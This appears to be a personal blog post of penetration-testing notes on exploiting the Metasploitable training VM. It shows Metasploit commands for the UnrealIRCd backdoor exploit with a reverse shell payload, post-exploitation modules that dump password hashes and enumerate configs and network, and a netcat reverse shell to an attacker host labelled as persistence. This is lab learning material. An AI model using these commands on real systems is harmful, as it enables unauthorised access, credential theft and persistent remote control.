---
title: pwning metasploitable
excerpt: >-
  This article will contain my personal notes on how to pwn metasploitable
categories:
  - Penetration-Testing
tags:
  - pentest
---

## Prerequisites

During the [Pluralsight course](https://jeanfrancoismaes.github.io/work-adventures/penetration-testing:/Intro-to-Kali/) we have scanned the metasploitable machine using openvas. Now we will use the scan results to pwn the machine.

### Abusing unrealircd (port 6667)

Openvas shows that the metasploitable machine is running an outdated version of unrealircd which has a vulnrability in it that can give you a shell in the machine. We will abuse this flaw now:

```
service postgresql start #start postgres for this exploit to work
msfconsole # start metasploit
workspace -a metasploitable #create a workspace called metasploitable
workspace #lists all the workspaces within metasploit
workspace metasploit #to get into metasploitable workspace
search ircd #search msf for ircd entries -> in this case will return exploit/unix/irc/unreal_ircd_3281_backdoor
info exploit/unix/irc/unreal_ircd_3281_backdoor # returns information about exploit
use exploit/unix/irc/unreal_ircd_3281_backdoor # tells metasploit we want to use this exploit
show options #shows parameters for this exploit
set RHOST <ip of metasploitable> #sets target IP
show payloads #shows all available payloads for this exploit
set PAYLOAD cmd/unix/reverse #sets payload
show options # shows parameters for this payloads
set LHOST<ip of attacker> #sets listener IP
exploit # starts the attack
```
And now we have a shell in the target machine, PWND!

`ctrl + z # background the open session (or close it )`

### Post Exploitation Activities

```
use post/linux/gather/hashdump #attempts to get passwords
set SESSION 1 # sets the session required for this exploit
exploit #executes
use post/linux/gather/checkvm #checks if machine is a VM
set SESSION 1 #sets the session requires for this exploit
exploit #executes
use post/linux/gather/enum_configs #get the config files and stores them in our system
set SESSION 1 #sets the session
exploit
use post/linux/gater/enum_network #enumerate the network
set SESSION 1 #sets the session  
exploit
```

### Persistence
We will use netcad. (but you can also use any rootkit/backdoor/...)

```
nc -lvp 4444 #setup a listener on your own machine for port 4444
nc -vn <attackerip> -e /bin/bash

```
